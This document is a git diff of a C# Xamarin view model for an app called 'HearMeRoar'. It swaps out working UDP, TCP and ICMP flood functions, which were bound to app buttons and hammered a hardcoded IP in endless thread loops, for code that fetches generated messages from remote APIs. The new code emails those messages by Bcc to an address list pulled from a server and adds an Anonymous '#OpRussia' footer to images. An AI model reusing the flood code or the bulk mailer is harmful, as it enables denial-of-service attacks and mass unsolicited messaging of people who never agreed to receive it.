@@ -41,6 +41,7 @@ namespace HearMeRoar.ViewModels
         {
 
             ShowRunning = true;
+            CallBindingStart();
             PageTitle = AppTitle;
             GenerateMsgButtonText = "Continue";
             GenerateMsg = new Command(() => GenerateMsgTxt());
@@ -49,18 +50,13 @@ namespace HearMeRoar.ViewModels
             ShareMessageMeme = new Command(() => shareMessageImage());
             ShareMessageText = new Command(() => shareMessageEmail());
 
-
-            UDPAttack = new Command(() => udpattack());
-            TCPAttack = new Command(() => tcpattack());
-            ICMPAttack = new Command(() => icmpattack());
-
             //set default image
             shareBackground = BitmapExtensions.LoadBitmapResource(GetType(), "HearMeRoar.ShareBackground2.jpg");
-
+            
             GetStringPoolData();
+
             CreateMessageImage(true);
 
-            ShowRunning = false;
         }
 
 
@@ -70,203 +66,16 @@ namespace HearMeRoar.ViewModels
             await Sms.ComposeAsync(message);
         }
 
-
-        private void readJSONData(string JSONData)
+        public ICommand ToggleLanguage => new Command(OnToggleLanguage);
+        private void OnToggleLanguage()
         {
-            string sLang = "RU";
-            string sLang_EN = "EN";
-            JObject objData = JObject.Parse(JSONData);
+            ShowEnglish = !ShowEnglish;
+            //FullMessageTextDisplay = FullMessageTextDisplay;
 
-            sSalutePool = objData["SalutationPool"].ToString();
-            sSubjPool = objData["SubjectPool"].ToString();
-            sBodyPool = objData["BodyPool"].ToString();
-            sClosePool = objData["ClosingPool"].ToString();
-            sSignPool = objData["SignaturPool"].ToString();
-            sThesPool = objData["ThesaurusPool"].ToString();
-            sSettings = objData["Settings"].ToString();
-
-            lstSalutePool = ParseDataFromJSON(sSalutePool, sLang);
-            lstSubjPool = ParseDataFromJSON(sSubjPool, sLang);
-            lstBodyPool = ParseDataFromJSON(sBodyPool, sLang);
-            lstClosePool = ParseDataFromJSON(sClosePool, sLang);
-            lstSignPool = ParseDataFromJSON(sSignPool, sLang);
-
-
-
-            lstSalutePool_EN = ParseDataFromJSON(sSalutePool, sLang_EN);
-            lstSubjPool_EN = ParseDataFromJSON(sSubjPool, sLang_EN);
-            lstBodyPool_EN = ParseDataFromJSON(sBodyPool, sLang_EN);
-            lstClosePool_EN = ParseDataFromJSON(sClosePool, sLang_EN);
-            lstSignPool_EN = ParseDataFromJSON(sSignPool, sLang_EN);
-
-            //Settings
-            try
-            {
-                NotificationText = GetSettingFromJSON(sSettings, "Disclaimer");
-                int.TryParse(GetSettingFromJSON(sSettings, "exclamationOccurence"), out salutationOccurence);
-                int.TryParse(GetSettingFromJSON(sSettings, "exclamationCount"), out salutationCount);
-                int.TryParse(GetSettingFromJSON(sSettings, "endOccurence"), out endOccurence);
-                int.TryParse(GetSettingFromJSON(sSettings, "endCount"), out endCount);
-
-                double.TryParse(GetSettingFromJSON(sSettings, "fontSizeRatio"), out _fontSizeRatio);
-                int.TryParse(GetSettingFromJSON(sSettings, "maxfontSize"), out _maxfontSize);
-                int.TryParse(GetSettingFromJSON(sSettings, "maxScreenHorizontalReducer"), out _maxScreenHorizontalReducer);
-                int.TryParse(GetSettingFromJSON(sSettings, "maxScreenVerticalReducer"), out _maxScreenVerticalReducer);
-                int.TryParse(GetSettingFromJSON(sSettings, "midScreenWidth"), out _midScreenWidth);
-                int.TryParse(GetSettingFromJSON(sSettings, "midScreenWidthReducer"), out _midScreenWidthReducer);
-                int.TryParse(GetSettingFromJSON(sSettings, "minfontSize"), out _minfontSize);
-                int.TryParse(GetSettingFromJSON(sSettings, "minScreenHeight"), out _minScreenHeight);
-                int.TryParse(GetSettingFromJSON(sSettings, "minScreenHeightReducer"), out _minScreenHeightReducer);
-
-
-                EmailListAPI = GetSettingFromJSON(sSettings, "emailListAPI");
-
-                OnPropertyChanged("ButtonWidth");
-                OnPropertyChanged("ButtonHeight");
-                OnPropertyChanged("TextFontSize");
-            }
-            finally { }
-
-            
-            ThesaurusEntries = new SlangFilter();
-            ThesaurusEntries = ParseSlangFilterJSON(sThesPool, sLang + "_Key", sLang + "_Replace", ThesaurusEntries);
-
-
-            ThesaurusEntries_EN = new SlangFilter();
-            ThesaurusEntries_EN = ParseSlangFilterJSON(sThesPool, sLang_EN + "_Key", sLang_EN + "_Replace", ThesaurusEntries);
+            CallBindingToggle();
         }
 
 
-        
-        private List<String> ParseDataFromJSON(string sJSON, string FieldName)
-        {
-            var array = JArray.Parse(sJSON);
-            List<String> sRet = new List<string>();
-
-            int i = 0;
-            foreach (var item in array)
-            {
-                try
-                {
-                    // CorrectElements  
-                    sRet.Add(item[FieldName].ToString());
-                }
-                catch (Exception ex)
-                {
-                    //do something
-                }
-                i += 1;
-            }
-            return sRet;
-        }
-
-
-        private string GetSettingFromJSON(string sJSON, string FieldName)
-        {
-            var array = JArray.Parse(sJSON);
-            string sRet = "";
-
-            int i = 0;
-            foreach (var item in array)
-            {
-                try
-                {
-                    if (item[FieldName] != null)
-                    {
-                        // CorrectElements  
-                        sRet = item[FieldName].ToString();
-                        break;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    //do something
-                }
-                i += 1;
-            }
-
-            return sRet;
-
-        }
-
-        private string GetFullMsgText_EN(string sJSON, string sEntry, string sLangTypeIn, string sLangTypeOut)
-        {
-            string sRet = "";
-
-            var array = JArray.Parse(sJSON);
-            foreach (var item in array)
-            {
-                try
-                {
-                    string s = item[sLangTypeIn].ToString();
-                    if (s.Trim() == sEntry.Trim())
-                    {
-                        sRet = item[sLangTypeOut].ToString();
-                        break;
-                    }
-                }
-                catch (Exception e)
-                {
-                    //do something or do nothing
-                }
-                finally
-                {
-                }
-            }
-
-            return sRet;
-        }
-
-        private SlangFilter ParseSlangFilterJSON(string sJSON, string slangWordKey, string slangWordReplace, SlangFilter dict)
-        {
-            var array = JArray.Parse(sJSON);
-            string sWordKey = String.Empty;
-            string sWordReplace = String.Empty;
-            int i = 0;
-            foreach (var item in array)
-            {
-                try
-                {
-                    sWordKey = String.Empty;
-                    sWordReplace = String.Empty;
-                    try
-                    {
-                        if (item[slangWordKey] != null)
-                        {
-                            sWordKey = item[slangWordKey].ToString();
-                            sWordReplace = item[slangWordReplace].ToString();
-
-                            dict.InsultFilterItems.Add(new SlangFilter.SlangFilterItem(sWordKey, sWordReplace));
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        //do something or do nothing
-                    }
-                    finally
-                    {
-                    }
-                }
-                catch (Exception ex)
-                {
-                    //do something
-                }
-                i += 1;
-            }
-
-            return dict;
-
-        }
-
-        public event PropertyChangedEventHandler PropertyChanged;
-        public void RaisePropertyChanged(string propertyName)
-        {
-            PropertyChangedEventHandler handler = PropertyChanged;
-            if (handler != null)
-            {
-                handler(this, new PropertyChangedEventArgs(propertyName));
-            }
-        }
 
         //to get remote data file
         public async void GetStringPoolData()
@@ -301,6 +110,117 @@ namespace HearMeRoar.ViewModels
             }
         }
 
+        private void readJSONData(string JSONData)
+        {
+            string sLang = "RU";
+            string sLang_EN = "EN";
+            JObject objData = JObject.Parse(JSONData);
+
+            sSettings = objData["Settings"].ToString();
+
+            //Settings
+            try
+            {
+                NotificationText = GetSettingFromJSON(sSettings, "Disclaimer");
+                int.TryParse(GetSettingFromJSON(sSettings, "exclamationOccurence"), out salutationOccurence);
+                int.TryParse(GetSettingFromJSON(sSettings, "exclamationCount"), out salutationCount);
+                int.TryParse(GetSettingFromJSON(sSettings, "endOccurence"), out endOccurence);
+                int.TryParse(GetSettingFromJSON(sSettings, "endCount"), out endCount);
+
+                double.TryParse(GetSettingFromJSON(sSettings, "fontSizeRatio"), out _fontSizeRatio);
+                int.TryParse(GetSettingFromJSON(sSettings, "maxfontSize"), out _maxfontSize);
+                int.TryParse(GetSettingFromJSON(sSettings, "maxScreenHorizontalReducer"), out _maxScreenHorizontalReducer);
+                int.TryParse(GetSettingFromJSON(sSettings, "maxScreenVerticalReducer"), out _maxScreenVerticalReducer);
+                int.TryParse(GetSettingFromJSON(sSettings, "midScreenWidth"), out _midScreenWidth);
+                int.TryParse(GetSettingFromJSON(sSettings, "midScreenWidthReducer"), out _midScreenWidthReducer);
+                int.TryParse(GetSettingFromJSON(sSettings, "minfontSize"), out _minfontSize);
+                int.TryParse(GetSettingFromJSON(sSettings, "minScreenHeight"), out _minScreenHeight);
+                int.TryParse(GetSettingFromJSON(sSettings, "minScreenHeightReducer"), out _minScreenHeightReducer);
+
+
+                EmailListAPI = GetSettingFromJSON(sSettings, "emailListAPI");
+                GrammarAPI = GetSettingFromJSON(sSettings, "grammarAPI");
+                SubjectAPI = GetSettingFromJSON(sSettings, "subjectAPI");
+
+                OnPropertyChanged("ButtonWidth");
+                OnPropertyChanged("ButtonHeight");
+                OnPropertyChanged("TextFontSize");
+            }
+            finally
+            {
+                OnPropertyChanged("ShowRunning");
+                OnPropertyChanged("FullMessageTextDisplay");
+                OnPropertyChanged("FullMessageText");
+            }
+
+        }
+
+
+
+        private List<String> ParseDataFromJSON(string sJSON, string FieldName)
+        {
+            var array = JArray.Parse(sJSON);
+            List<String> sRet = new List<string>();
+
+            int i = 0;
+            foreach (var item in array)
+            {
+                try
+                {
+                    // CorrectElements  
+                    sRet.Add(item[FieldName].ToString());
+                }
+                catch (Exception ex)
+                {
+                    //do something
+                }
+                i += 1;
+            }
+            return sRet;
+        }
+
+
+        private string GetSettingFromJSON(string sJSON, string FieldName)
+        {
+            var array = JArray.Parse(sJSON);
+            string sRet = "";
+
+            int i = 0;
+            foreach (var item in array)
+            {
+                try
+                {
+                    // CorrectElements  
+                    if (item[FieldName] != null)
+                    {
+                        sRet = item[FieldName].ToString();
+                        break;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    //do something
+                }
+                i += 1;
+            }
+                
+
+            return sRet;
+
+        }
+                
+
+        public event PropertyChangedEventHandler PropertyChanged;
+        public void RaisePropertyChanged(string propertyName)
+        {
+            PropertyChangedEventHandler handler = PropertyChanged;
+            if (handler != null)
+            {
+                handler(this, new PropertyChangedEventArgs(propertyName));
+            }
+        }
+
+        
         public async Task<string> GetEmailsAsync()
         {
             string sRet = "503";
@@ -362,6 +282,92 @@ namespace HearMeRoar.ViewModels
             return sRet;
         }
 
+
+        public async Task<string> GetMessagesAsync()
+        {
+            string sRet = "503";
+
+            //URL for the content or JSON data.
+            string sGrammarAPI = GrammarAPI;
+
+            string sJSONData = string.Empty;
+            //Getting the content from the web
+            var baseAddress = new Uri(sGrammarAPI);
+            //var cookieContainer = new CookieContainer();
+            //using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
+            using (HttpClient client = new HttpClient())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    try
+                    {
+                        string sContentData = await client.GetStringAsync(baseAddress);
+                        sJSONData = sContentData;
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        //unable to retrieve file from internet
+                        Task.Delay(1000).Wait();
+                    }
+                }
+
+                if (sJSONData == string.Empty)
+                {
+                    sRet = "503";
+                }
+                else
+                {
+                    sRet = sJSONData;
+                }
+            }
+
+            return sRet;
+        }
+
+
+        public async Task<string> GetSubjectAsync()
+        {
+            string sRet = "503";
+
+            //URL for the content or JSON data.
+            string sSubjectAPI = SubjectAPI;
+
+            string sJSONData = string.Empty;
+            //Getting the content from the web
+            var baseAddress = new Uri(sSubjectAPI);
+            //var cookieContainer = new CookieContainer();
+            //using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
+            using (HttpClient client = new HttpClient())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    try
+                    {
+                        string sContentData = await client.GetStringAsync(baseAddress);
+                        sJSONData = sContentData;
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        //unable to retrieve file from internet
+                        Task.Delay(1000).Wait();
+                    }
+                }
+
+                if (sJSONData == string.Empty)
+                {
+                    sRet = "503";
+                }
+                else
+                {
+                    sRet = sJSONData;
+                }
+            }
+
+            return sRet;
+        }
+
         //save the data locally
         public void set_post_data(string json)
         {
@@ -374,183 +380,70 @@ namespace HearMeRoar.ViewModels
             return Application.Current.Properties["hear_me_roar_data"].ToString();
         }
 
-        
+
         public ICommand CopyText { private set; get; }
         public ICommand CreateVoiceMessage { private set; get; }
         public ICommand GenerateMsg { private set; get; }
         public ICommand ShareMessageMeme { private set; get; }
         public ICommand ShareMessageText { private set; get; }
-
-        public ICommand UDPAttack { private set; get; }
-        public ICommand TCPAttack { private set; get; }
-        public ICommand ICMPAttack { private set; get; }
         public interface IGetFileStream
         {
             MemoryStream getStream();
-        }
-
-
-        public static String generateStringSize(long sizeByte)
-        {
-
-            StringBuilder sb = new StringBuilder();
-            Random rd = new Random();
-
-            var numOfChars = sizeByte;
-            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-            int maxIndex = allows.Length - 1;
-            for (int i = 0; i < numOfChars; i++)
-            {
-                int index = rd.Next(maxIndex);
-                char c = allows[index];
-                sb.Append(c);
-            }
-            return sb.ToString();
-        }
-
-        string sIP = "192.168.1.1";
-        string sPort = "80";
-        string sSize = "10"; 
-        public int amountint = 0;
-        public int amountfint = 0;
-
-        public void udpattack()
-        {
-
-            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
-                ProtocolType.Udp);
-
-            IPAddress serverAddr = IPAddress.Parse(sIP);
-
-            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(sPort));
-            string data = generateStringSize(1024 * int.Parse(sSize));
-            byte[] sus = Encoding.ASCII.GetBytes(data);
-            sock.Connect(serverAddr, int.Parse(sPort));
-            for (; ; )
-            {
-                new Thread(() =>
-                {
-                    try
-                    {
-                        sock.SendTo(sus, endPoint);
-                        amountint++;
-                    }
-                    catch
-                    {
-                        amountfint++;
-                    }
-                }).Start();
-            }
-        }
-        public void tcpattack()
-        {
-            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            IPAddress serverAddr = IPAddress.Parse(sIP);
-
-            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(sPort));
-            string data = generateStringSize(1024 * int.Parse(sSize));
-            byte[] sus = Encoding.ASCII.GetBytes(data);
-            sock.Connect(serverAddr, int.Parse(sPort));
-            for (; ; )
-            {
-                new Thread(() =>
-                {
-                    try
-                    {
-                        sock.SendTo(sus, endPoint);
-                        amountint++;
-                    }
-                    catch
-                    {
-                        amountfint++;
-                    }
-                }).Start();
-            }
-        }
-        public void icmpattack()
-        {
-            new Thread(() =>
-            {
-                Ping pingSender = new Ping();
-                string data = generateStringSize(1024 * 1);
-                byte[] sus = Encoding.ASCII.GetBytes(data);
-                int timeout = 5000;
-                PingOptions options = new PingOptions(64, true);
-                for (; ; )
-                {
-                    new Thread(() =>
-                    {
-                        try
-                        {
-                            PingReply reply = pingSender.Send(sIP, timeout, sus, options);
-                            amountint++;
-                        }
-                        catch
-                        {
-                            amountfint++;
-                        }
-                    }).Start();
-                }
-            }).Start();
         }
 
         async void GenerateMsgTxt()
         {
             NotificationColor = "Black";
             GenerateMsgButtonText = "Generate New Message";
-            Random rnd = new Random();
-            ShareFileName = ShareOriginalFileName;
-            NotificationText = string.Empty;
 
+            getNewMessage();
 
-            //randomize the insult pool records
-            if (rnd.Next(0, salutationCount) <= salutationOccurence)
+            int iLen = FullMessageText.Length;
+            if(iLen > 950)
             {
-                MessageSalutation = GetRandomEntry(rnd, lstSalutePool) + " ";
-            }
-            else
-            {
-                MessageSalutation = string.Empty;
+                while(iLen > 950)
+                {
+                    getNewMessage();
+                    iLen = FullMessageText.Length;
+                }
             }
 
-            EmailSubjectText = GetRandomEntry(rnd, lstSubjPool) + " ";
+            getNewSubject();
 
-            Body1 = GetRandomEntry(rnd, lstBodyPool) + " ";
+            iLen = FullSubjectText.Length;
+            if (iLen > 950)
+            {
+                while (iLen > 950)
+                {
+                    getNewSubject();
+                    iLen = FullSubjectText.Length;
+                }
+            }
 
-            MsgCloseText = GetRandomEntry(rnd, lstClosePool) + " ";
+            Thread.Sleep(100);
 
-            MsgSignText = GetRandomEntry(rnd, lstSignPool) + " ";
-
-
-
-            MessageSalutation_EN = GetFullMsgText_EN(sSalutePool, MessageSalutation.ToString(), "RU", "EN");
-            EmailSubjectText_EN = GetFullMsgText_EN(sSubjPool, EmailSubjectText.ToString(), "RU", "EN");
-            Body1_EN = GetFullMsgText_EN(sBodyPool, Body1.ToString(), "RU", "EN");
-            MsgCloseText_EN = GetFullMsgText_EN(sClosePool, MsgCloseText.ToString(), "RU", "EN");
-            MsgSignText_EN = GetFullMsgText_EN(sSignPool, MsgSignText.ToString(), "RU", "EN");
-
-
-            FullMessageText_EN = MessageSalutation_EN.ToString() + "\r\n\r\n" + Body1_EN.ToString() + "\r\n\r\n" + MsgCloseText_EN.ToString() + "\r\n\r\n" + MsgSignText_EN.ToString();
-            OnPropertyChanged("FullMessageTextDisplay_EN");
-
-            CreateMessageImage();
-            ShowShare = true;
+            if (!ShowShare)
+            {
+                ShowShare = true;
+            }
+            CallBindingComplete();
         }
+
 
 
         public virtual async void SayMessage()
         {
             NotificationColor = "Black";
-            string sMsg = MessageSalutation.ToString() + EmailSubjectText.ToString() + Body1.ToString() + MsgCloseText.ToString() + MsgSignText.ToString();
-            SayStuffAsync(Thesaurusify(sMsg));
+            string sMsg = FullMessageText;
+            SayStuffAsync((sMsg));
         }
 
 
         public virtual async void CopyToClipboard()
         {
             NotificationColor = "Black";
-            string sMsg = MessageSalutation.ToString() + EmailSubjectText.ToString() + Body1.ToString() + MsgCloseText.ToString() + MsgSignText.ToString();
-            await Clipboard.SetTextAsync(Thesaurusify(sMsg));
+            string sMsg = FullMessageText;
+            await Clipboard.SetTextAsync((sMsg));
         }
 
         SKBitmap shareBackground;
@@ -576,10 +469,80 @@ namespace HearMeRoar.ViewModels
         }
 
 
+        public virtual async void getNewMessage()
+        {
+            NotificationColor = "Black";
+            ShowRunning = true;
+            CallBindingStart();
+            try
+            {
+                string sMessage = await GetMessagesAsync();
+
+                if (sMessage != "503")
+                {
+                    JObject o = JObject.Parse(sMessage);
+
+                    //string s = o["grammar"].ToString();
+                    //JObject x = JObject.Parse(s);
+
+                    FullMessageText_EN = o["grammar"][1].ToString();
+                    FullMessageText = o["grammar"][2].ToString();
+                    NotificationText = String.Empty;
+                    CreateMessageImage();
+                }
+                else
+                {
+                    NotificationText = "Server Busy";
+                    NotificationColor = "DarkRed";
+                    OnPropertyChanged("TextFontSize");
+                    OnPropertyChanged("NotificationColor");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Some other exception occurred  
+            }
+        }
+
+        public virtual async void getNewSubject()
+        {
+            NotificationColor = "Black";
+            ShowRunning = true;
+            CallBindingStart();
+            try
+            {
+                string sMessage = await GetSubjectAsync();
+
+                if (sMessage != "503")
+                {
+                    JObject o = JObject.Parse(sMessage);
+
+                    string s = o["grammar"].ToString();
+
+                    FullSubjectText_EN = s[0].ToString();
+                    FullSubjectText = s[1].ToString();
+                    NotificationText = String.Empty;
+                }
+                else
+                {
+                    NotificationText = "Server Busy";
+                    NotificationColor = "DarkRed";
+                    OnPropertyChanged("TextFontSize");
+                    OnPropertyChanged("NotificationColor");
+                }
+            }
+            catch (Exception ex)
+            {
+                // Some other exception occurred  
+            }
+        }
+
+
         public virtual async void shareMessageEmail()
         {
             NotificationColor = "Black";
             ShowRunning = true;
+            CallBindingStart();
             try
             {
                 string sEmails = await GetEmailsAsync();
@@ -599,7 +562,7 @@ namespace HearMeRoar.ViewModels
 
                     var message = new EmailMessage
                     {
-                        Subject = EmailSubjectText.ToString(),
+                        Subject = FullSubjectTextDisplay,
                         Body = FullMessageTextDisplay,
                         Bcc = lstEmails
                     };
@@ -623,7 +586,6 @@ namespace HearMeRoar.ViewModels
             {
                 // Some other exception occurred  
             }
-            ShowRunning = false;
         }
 
         public void CreateMessageImage(bool loadEmpty = false)
@@ -631,19 +593,20 @@ namespace HearMeRoar.ViewModels
             string sFullMsgText = "";
             if (loadEmpty == false)
             {
-                sFullMsgText = MessageSalutation.ToString() + "\r\n\r\n" + Body1.ToString() + "\r\n\r\n" + MsgCloseText.ToString() + "\r\n\r\n" + MsgSignText.ToString();
+                sFullMsgText = FullMessageText;
             }
             int memeWidth = 600;
-            int memeHeight = 300;
+            int memeHeight = 650;
             int footerBuffer = 30;
             int insultHeight = 0;
             float textSize = 25;
-            float textFooterSize = 10;
+            float textFooterSize = 15;
             int insultBuffer = 10;
             int rowMaxWidth = 590;
 
             //clean up extra spaces
             sFullMsgText = sFullMsgText.Replace("   ", " ").Replace("  ", " ").Replace(" .", ".");
+
 
             //update shell menu
             AppShell AppShellInstance = Xamarin.Forms.Shell.Current as AppShell;
@@ -736,11 +699,11 @@ namespace HearMeRoar.ViewModels
                     textPaint.MeasureText(item, ref textBounds);
                     // Calculate offsets to center the text on the screen
                     float xText = 10;//memeWidth / 2 - textBounds.MidX;
-                    float yText = memeHeight - ((memeHeight - footerBuffer) / 2) - (insultHeight / 2) + (lineNumber + textSize) - footerBuffer;
+                    float yText = memeHeight - ((memeHeight) / 2) - (insultHeight / 2) + (lineNumber + textSize) - footerBuffer;
 
                     //line buffer
                     yText = yText + ((lineNumber - 1) * textSize);
-                    yText = yText + 50;
+                    //yText = yText + 50;
 
 
                     // And draw the text
@@ -749,7 +712,7 @@ namespace HearMeRoar.ViewModels
                 }
 
                 //draw footer
-                string footerText = "";//"STOP ALL WARS";
+                string footerText = "We are legion. We do not forgive. We do not Forget. Expect us. #OpRussia";//"STOP ALL WARS";
 
                 //Check dimensions of final insult text for centering
                 textPaintFooter.MeasureText(footerText, ref textBounds);
@@ -767,13 +730,17 @@ namespace HearMeRoar.ViewModels
             Content = canvasView;
 
 
+            //crop here
+
+
+
 
             //save bitmap to file
             // create an image and then get the PNG (or any other) encoded data
             using (var image = SKImage.FromBitmap(ShareBitmap))
             using (var data = image.Encode(SKEncodedImageFormat.Png, 80))
             { // save the data to a stream
-                using (Stream fileStream = File.Open(System.IO.Path.Combine(FileSystem.AppDataDirectory, shareFileName), FileMode.Create))
+                using (Stream fileStream = File.Open(System.IO.Path.Combine(FileSystem.AppDataDirectory, "x" + shareFileName), FileMode.Create))
                 {
                     data.SaveTo(fileStream);    //fileStream.Write(Contents, 0, Contents.Length);
                 }
@@ -788,12 +755,13 @@ namespace HearMeRoar.ViewModels
             Image bitmap = new Image { Source = ImageSource.FromStream(() => myStream) };
             AppBitmap = bitmap.Source;
 
-            ShareFileName = System.IO.Path.Combine(FileSystem.AppDataDirectory, shareFileName);
+            ShareFileName = System.IO.Path.Combine(FileSystem.AppDataDirectory, "x" + shareFileName);
 
 
             FullMessageText = sFullMsgText;
             OnPropertyChanged("FullMessageTextDisplay");
         }
+
 
         public static string ToUpperFirstLetter(string source)
         {
@@ -905,5 +873,5 @@ namespace HearMeRoar.ViewModels
             return arry;
         }
     }
-
+    
 }
